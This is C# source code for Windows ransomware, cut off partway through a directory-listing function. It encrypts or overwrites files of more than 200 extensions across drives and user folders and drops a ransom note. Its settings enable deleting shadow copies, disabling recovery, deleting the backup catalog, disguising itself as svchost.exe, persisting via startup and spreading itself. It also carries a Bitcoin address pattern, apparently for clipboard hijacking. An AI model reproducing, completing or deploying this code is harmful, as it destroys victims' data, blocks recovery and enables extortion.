using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "owo.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "lol.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[1] { "You are too stupid. All your file has been encrypted." };

	private static string[] validExtensions = new string[232]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".exe",
		".bat", ".cmd"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>2UB/3nOESgk0EzmIECCcWCjlOPI+/7kWX/ZVR+KAwSTDwUYibI01SPEjibLYx0VNEPrx7/igx+NxcXoTmRwThYLVcbAB0oghw50DYp47s/pt7Pc6t4qJA5fYK5BsB+wChzJhbB6kXvUx8jUBVT6s/5lX9Bs6WPizFs9qwh9oUGk=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
